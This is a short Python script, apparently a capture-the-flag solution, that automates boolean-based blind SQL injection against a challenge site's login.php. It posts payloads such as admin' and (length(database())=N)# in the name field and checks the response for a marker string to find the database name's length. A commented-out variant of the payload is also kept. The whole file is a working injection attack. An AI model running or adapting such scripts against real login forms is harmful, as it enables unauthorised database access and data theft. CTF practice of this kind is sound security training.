# coding:utf-8

import requests
import string

dic = string.digits + string.ascii_letters + "!@#$%^&*()_+{}-="
right = '8bef'
worry = '5728'
url = 'http://eci-2ze2rfy5gx38w2yfvgam.cloudeci1.ichunqiu.com/login.php'
for i in range(30):
    # key = "admin%1$' and " + "(length(database())=" + str(i) + ")#"
    key = "admin' and " + "(length(database())=" + str(i) + ")#"
    data = {'name': key, 'pass': '123'}
    r = requests.post(url, data=data).text
    # print(r)
    if right in str(r):
        print('the length of database is %s' % i)

